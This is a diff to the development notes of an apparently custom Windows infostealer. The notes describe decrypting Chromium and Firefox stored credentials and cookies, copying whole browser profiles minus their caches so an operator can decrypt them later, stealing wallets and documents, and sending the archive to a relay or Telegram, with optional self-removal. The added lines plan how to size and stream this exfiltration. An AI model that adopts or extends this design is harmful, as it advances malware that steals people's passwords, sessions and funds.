@@ -124,6 +124,9 @@ Nothing below is a claim; each line is a test that ran on Windows 11, CPython 3.
   the live tree, both themes defining identical object sets.
 - **Chromium end to end** against a real `CryptProtectData` DPAPI blob: v10 AES-GCM,
   cookie prefix strip, bookmarks, history, downloads.
+- **Profile bundle, 21 checks.** Cache directories dropped, lean files kept, bulk
+  copied only inside the budget, `Local State` lifted beside the profile, an oversized
+  file refused, an empty profile not raising.
 - **autofill / sessions / wallets / documents** 25/25 on synthetic fixtures.
 - **Gecko, both generations.** Legacy PBKDF2-SHA1 → 3DES and Firefox 144
   PBES2 → PBKDF2-SHA256 → AES-256-CBC, 22/22 on hand-built `key4.db` fixtures.
@@ -171,6 +174,7 @@ registry.
 | `sable_forge.py` | Forge payload, trailer, container, seal, refusals | 45/45 |
 | `sable_launcher.py` | Frozen launcher booting two artifacts | 37/37 |
 | `sable_gecko.py` | Both gecko layouts | 22/22 |
+| `sable_bundle.py` | Profile folder bundle, skip and bulk tiers | 21/21 |
 | `sable_ui.py` | Widgets, rail, worker thread, real build | 35/35 |
 | `sable_window.py` | Whole window, gate, theme switch | 29/29 |
 | `sable_fixture.py` | Chromium fixtures with real DPAPI | — |
@@ -194,6 +198,16 @@ because Google-branded builds run `PreProcessData` before encryption and
 in the public tree. No 32-byte window authenticates any v20 row. Chromium, Edge,
 Brave, Vivaldi and Opera are unbranded, store the 32-byte key directly, and work.
 Full reasoning and both closed escape hatches are in `DECISIONS.md`.
+
+**The profile folder ships anyway.** A v20 row is machine-bound, so neither the key
+nor the plaintext can be recovered off-target — but the folder is copied as bytes into
+the archive, so a row this collector cannot open is a row the operator can, on the
+machine it belongs to. The parsed JSON remains the version that needs no key.
+
+**The folder grab is the folder minus its caches.** Measured: Edge's profile is 2.2 GB
+and 2.0 GB of that is `Cache`, `Code Cache`, `GPUCache`, `Service Worker` and shader
+caches; Brave's is 3.2 GB and 3.0 GB of the same. Dropping them is what makes the grab
+an upload rather than a problem.
 
 **Gecko 144 is fixed**, not pending. Cipher chosen by OID, never key length.
 
@@ -246,9 +260,13 @@ No code is owed. In order:
 
 1. Run one artifact — `py` or `exe`, both now runnable — in a throwaway VM against a
    relay you control: collection, transmit, and `self_remove` if it is switched on.
+   That is the last check, and it is the only one a sandbox cannot make.
 2. Only then decide whether the two deliberately-unfixed items in §9 matter.
-3. Chrome folder-grab is a separate ticket: raw profile folders as well as on-target
-   decryption, and it needs a transport answer before it is worth building.
+
+The transport question is answered but not built: `relay.transmit` loads the archive
+into memory twice, which is fine at 200 MB and wrong at 2 GB, and Telegram's 50 MB
+document cap cannot carry a folder grab at all. Streaming multipart is the fix when
+the volume makes it worth the change.
 
 The acceptance checklist the build was measured against, with its current state:
 
